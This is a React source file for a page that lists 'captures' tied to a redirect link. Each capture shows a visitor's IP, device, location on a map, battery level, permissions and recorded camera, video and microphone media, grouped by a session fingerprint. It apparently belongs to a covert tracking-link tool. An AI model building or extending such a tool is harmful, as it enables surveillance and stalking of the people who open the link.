import * as React from 'react';
import { useParams, Link } from 'react-router-dom';
import { MapContainer, TileLayer, Marker, useMap } from 'react-leaflet';
import { useSettings, useNotification } from '../contexts/SettingsContext';
import { useLanguage } from '../contexts/LanguageContext';
import { db } from '../firebase';
import { collection, query, where, getDocs, doc, updateDoc, orderBy } from 'firebase/firestore';
import type { CapturedData, Settings } from '../types';

const ArrowLeftIcon: React.FC<{className?: string}> = ({className}) => (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>);
const LoadingSpinner: React.FC<{className?: string}> = ({className}) => (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={`animate-spin ${className}`}><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>);
const ChevronDownIcon: React.FC<{className?: string}> = ({className}) => (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><polyline points="6 9 12 15 18 9"></polyline></svg>);
const DatabaseIcon = () => <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/></svg>;
const PencilIcon: React.FC<{className?: string}> = ({className}) => (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z"/><path d="m15 5 4 4"/></svg>);
const InfoIcon: React.FC<{ className?: string }> = ({ className }) => (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><circle cx="12" cy="12" r="10" /><line x1="12" y1="16" x2="12" y2="12" /><line x1="12" y1="8" x2="12.01" y2="8" /></svg>);
const ExternalLinkIcon: React.FC<{className?: string}> = ({className}) => (<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>);


const MapUpdater: React.FC<{ position: [number, number] }> = ({ position }) => {
  const map = useMap();
  React.useEffect(() => {
    map.setView(position, map.getZoom());
  }, [position, map]);
  return null;
};

const DataRow: React.FC<{ label: string, value: React.ReactNode, isWide?: boolean }> = ({ label, value, isWide = false }) => (
    <div className={`py-3 px-1 border-t border-slate-700/50 ${isWide ? 'sm:col-span-2' : ''}`}>
        <dt className="text-sm font-medium text-slate-400">{label}</dt>
        <dd className="mt-1 text-sm text-white truncate font-mono">{value || '—'}</dd>
    </div>
);

const CaptureAccordion: React.FC<{ capture: CapturedData }> = ({ capture }) => {
    const [isOpen, setIsOpen] = React.useState(false);
    const [isEditing, setIsEditing] = React.useState(false);
    const [name, setName] = React.useState(capture.name);
    const { t } = useLanguage();
    const addNotification = useNotification();

    const handleNameUpdate = async () => {
        if (name === capture.name) {
            setIsEditing(false);
            return;
        }
        try {
            const docRef = doc(db, 'captures', capture.id);
            await updateDoc(docRef, { name });
            addNotification({ type: 'success', message: 'notification_name_updated' });
            setIsEditing(false);
        } catch (error) {
            console.error("Failed to update name:", error);
            addNotification({ type: 'error', message: 'notification_name_update_failed' });
        }
    };
    
    const permissionStatus = (status: string) => {
        if (status === 'granted') return <span className="text-green-400">{t('data_viewer_granted')}</span>;
        if (status === 'denied') return <span className="text-red-400">{t('data_viewer_denied')}</span>;
        return <span className="text-slate-500">{t('data_viewer_not_applicable')}</span>
    };

    return (
        <div className="bg-slate-800/50 border border-slate-700/50 rounded-xl overflow-hidden">
            {capture.status === 'incomplete' && (
                <div className="p-3 bg-yellow-500/10 text-yellow-300 text-xs font-semibold flex items-center gap-2 border-b border-yellow-500/20">
                    <InfoIcon className="w-4 h-4 flex-shrink-0" />
                    <span>{t('data_viewer_incomplete_capture_warning')}</span>
                </div>
            )}
            <button onClick={() => setIsOpen(!isOpen)} className="w-full flex justify-between items-center p-4 text-left">
                <div className="flex-grow group flex items-center gap-2 min-w-0">
                    {isEditing ? (
                         <input 
                            type="text"
                            value={name}
                            autoFocus
                            onClick={e => e.stopPropagation()}
                            onChange={e => setName(e.target.value)}
                            onKeyDown={e => {
                                if (e.key === 'Enter') handleNameUpdate();
                                if (e.key === 'Escape') {
                                    setName(capture.name);
                                    setIsEditing(false);
                                }
                            }}
                            onBlur={handleNameUpdate}
                            className="w-full bg-slate-700 p-1 rounded-md border border-slate-600 focus:ring-2 focus:ring-indigo-500 outline-none"
                         />
                    ) : (
                        <div className="flex items-center gap-2 min-w-0">
                            <h3 className="font-semibold text-white truncate" title={name}>{name}</h3>
                            <button onClick={(e) => { e.stopPropagation(); setIsEditing(true); }} className="opacity-0 group-hover:opacity-100 transition-opacity text-slate-400 hover:text-white flex-shrink-0">
                                <PencilIcon className="w-4 h-4" />
                            </button>
                        </div>
                    )}
                </div>
                 <div className="text-right flex-shrink-0 ml-4">
                    <p className="text-sm text-slate-400">{new Date(capture.timestamp).toLocaleString()}</p>
                </div>
                <ChevronDownIcon className={`w-6 h-6 text-slate-400 transition-transform ml-2 ${isOpen ? 'rotate-180' : ''}`} />
            </button>
            {isOpen && (
                <div className="p-4 border-t border-slate-700/50 animate-fade-in">
                    <dl className="grid grid-cols-1 sm:grid-cols-2 gap-x-4">
                        <DataRow label={t('data_viewer_ip')} value={capture.ip} />
                        <DataRow label={t('data_viewer_device')} value={`${capture.deviceType} / ${capture.os}`} />
                        <DataRow label={t('data_viewer_browser')} value={capture.browser} />
                        <DataRow label={t('data_viewer_language')} value={capture.language} />
                        <DataRow label={t('data_viewer_timezone')} value={capture.timezone} />
                        <DataRow label={t('data_viewer_captured_at')} value={new Date(capture.timestamp).toLocaleString()} />
                         <DataRow label={t('data_viewer_battery_status')} value={capture.battery ? `${capture.battery.level}% ${capture.battery.charging ? t('data_viewer_battery_charging') : ''}`: t('data_viewer_not_applicable')} />
                        <div className="py-3 px-1 border-t border-slate-700/50 sm:col-span-2">
                             <dt className="text-sm font-medium text-slate-400">{t('data_viewer_permissions')}</dt>
                             <dd className="mt-1 text-sm text-white font-mono flex flex-wrap gap-x-4 gap-y-1">
                                <span>Camera: {permissionStatus(capture.permissions?.camera || 'n/a')}</span>
                                <span>Mic: {permissionStatus(capture.permissions?.microphone || 'n/a')}</span>
                                <span>Location: {permissionStatus(capture.permissions?.location || 'n/a')}</span>
                             </dd>
                        </div>
                        <div className="py-3 px-1 border-t border-slate-700/50 sm:col-span-2">
                            <dt className="text-sm font-medium text-slate-400">{capture.location.source === 'gps' ? t('data_viewer_location_source_gps') : t('data_viewer_location_source_ip')}</dt>
                             <dd className="mt-1 text-sm text-white font-mono">
                                {capture.location.source === 'gps' && capture.location.address && capture.location.address !== 'N/A'
                                    ? capture.location.address
                                    : `${capture.location.city}, ${capture.location.country}`
                                }
                             </dd>
                        </div>
                        {capture.location.accuracy && <DataRow label={t('data_viewer_location_accuracy')} value={`${capture.location.accuracy.toFixed(0)}m`} />}
                        
                        {capture.location.lat && capture.location.lon && (
                            <div className="py-3 px-1 border-t border-slate-700/50 sm:col-span-2">
                                <a
                                  href={`https://www.google.com/maps/search/?api=1&query=${capture.location.lat},${capture.location.lon}`}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className="inline-flex items-center justify-center gap-2 w-full sm:w-auto px-4 py-2 bg-slate-700 text-white font-semibold rounded-lg hover:bg-indigo-600 transition-colors shadow-md text-sm"
                                >
                                    <ExternalLinkIcon className="w-5 h-5" />
                                    {t('data_viewer_open_in_google_maps')}
                                </a>
                            </div>
                        )}

                        {capture.location.lat && capture.location.lon && (
                            <div className="mt-2 h-64 w-full rounded-lg overflow-hidden border border-slate-700/50 sm:col-span-2">
                                <MapContainer center={[capture.location.lat, capture.location.lon]} zoom={11} scrollWheelZoom={false} style={{ height: "100%", width: "100%", backgroundColor: '#1e293b' }}>
                                    <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                                    <Marker position={[capture.location.lat, capture.location.lon]} />
                                    <MapUpdater position={[capture.location.lat, capture.location.lon]} />
                                </MapContainer>
                            </div>
                        )}
                    </dl>

                    {(capture.cameraPhotoCapture || capture.cameraCapture || capture.microphoneCapture) && (
                        <div className="mt-4 pt-4 border-t border-slate-700/50">
                            <h4 className="text-base font-semibold text-white mb-2">{t('data_viewer_captured_media')}</h4>
                            <div className="space-y-4">
                                {capture.cameraPhotoCapture && (
                                    <div>
                                        <p className="text-sm font-medium text-slate-400 mb-1">{t('data_viewer_captured_photo')}</p>
                                        <a href={capture.cameraPhotoCapture} target="_blank" rel="noopener noreferrer">
                                            <img src={capture.cameraPhotoCapture} alt="Captured from camera" className="rounded-lg border border-slate-700 w-full max-w-sm bg-black object-contain" />
                                        </a>
                                    </div>
                                )}
                                <div className="flex flex-col sm:flex-row gap-4">
                                    {capture.cameraCapture && (
                                        <div className="flex-1">
                                            <p className="text-sm font-medium text-slate-400 mb-1">{t('data_viewer_captured_video')}</p>
                                            <video controls src={capture.cameraCapture} className="rounded-lg border border-slate-700 w-full bg-black"></video>
                                        </div>
                                    )}
                                    {capture.microphoneCapture && (
                                        <div className="flex-1">
                                            <p className="text-sm font-medium text-slate-400 mb-1">{t('data_viewer_captured_audio')}</p>
                                            <audio controls src={capture.microphoneCapture} className="w-full"></audio>
                                        </div>
                                    )}
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            )}
        </div>
    );
};

const getCaptureFingerprint = (capture: CapturedData) => {
    return `${capture.ip}|${capture.userAgent}|${capture.language}`;
};

const DataViewerPage: React.FC = () => {
    const { id } = useParams<{ id: string }>();
    const { getConfig, clearUnreadCount } = useSettings();
    const { t } = useLanguage();
    const [captures, setCaptures] = React.useState<CapturedData[]>([]);
    const [loading, setLoading] = React.useState(true);
    const [config, setConfig] = React.useState<Settings | null>(null);

    React.useEffect(() => {
        if (!id) return;
        
        // Mark captures for this redirect as "read"
        clearUnreadCount(id);
        
        const currentConfig = getConfig(id);
        if (currentConfig) {
            setConfig(currentConfig);
        }

        const fetchCaptures = async () => {
            try {
                const q = query(collection(db, 'captures'), where('redirectId', '==', id), orderBy('timestamp', 'desc'));
                const querySnapshot = await getDocs(q);
                const data = querySnapshot.docs.map(doc => ({ id: doc.id, ...doc.data() } as CapturedData));
                setCaptures(data);
            } catch (error) {
                console.error("Error fetching captured data:", error);
            } finally {
                setLoading(false);
            }
        };

        fetchCaptures();
    }, [id, getConfig, clearUnreadCount]);

    const groupedCaptures = React.useMemo(() => {
        return captures.reduce((acc, capture) => {
            const fingerprint = getCaptureFingerprint(capture);
            if (!acc[fingerprint]) {
                acc[fingerprint] = [];
            }
            acc[fingerprint].push(capture);
            return acc;
        }, {} as Record<string, CapturedData[]>);
    }, [captures]);

    const renderedFingerprints = new Set<string>();
    
    return (
        <div className="w-full h-full p-4 sm:p-6 lg:p-8 overflow-y-auto dark">
            <div className="max-w-4xl mx-auto">
                <header className="flex items-center gap-4 mb-8">
                     <Link to="/" className="p-2 text-slate-400 hover:text-white hover:bg-slate-700 rounded-full transition-colors flex-shrink-0">
                        <ArrowLeftIcon />
                     </Link>
                     <div>
                        <h1 className="text-2xl sm:text-3xl font-bold text-white">{t('data_viewer_title', { name: config?.name || '...' })}</h1>
                        <p className="text-slate-400">{t('home_subtitle')}</p>
                     </div>
                </header>

                {loading ? (
                    <div className="flex justify-center items-center py-20">
                        <LoadingSpinner className="w-8 h-8 text-indigo-400"/>
                    </div>
                ) : captures.length === 0 ? (
                    <div className="text-center py-20 px-6 bg-slate-800/50 rounded-xl border border-dashed border-slate-700 animate-fade-in">
                        <div className="inline-block p-5 bg-slate-700/50 rounded-full mb-6">
                            <DatabaseIcon />
                        </div>
                        <h2 className="text-2xl font-bold text-white">{t('data_viewer_no_data')}</h2>
                    </div>
                ) : (
                    <div className="space-y-4">
                        {captures.map(capture => {
                            const fingerprint = getCaptureFingerprint(capture);
                            const isNewGroup = !renderedFingerprints.has(fingerprint);
                            if (isNewGroup) {
                                renderedFingerprints.add(fingerprint);
                            }
                            const group = groupedCaptures[fingerprint] || [];

                            return (
                                <React.Fragment key={capture.id}>
                                    {isNewGroup && (
                                        <div className="pt-6">
                                           <div className="relative text-center my-4">
                                               <hr className="absolute top-1/2 left-0 w-full h-px bg-slate-700 -translate-y-1/2" />
                                               <span className="relative bg-slate-900 px-4 text-sm font-semibold text-slate-400">
                                                   Session from {capture.location.city} ({group.length} {group.length > 1 ? 'records' : 'record'})
                                               </span>
                                           </div>
                                        </div>
                                    )}
                                    <CaptureAccordion capture={capture} />
                                </React.Fragment>
                            )
                        })}
                    </div>
                )}
            </div>
        </div>
    );
};

export default DataViewerPage;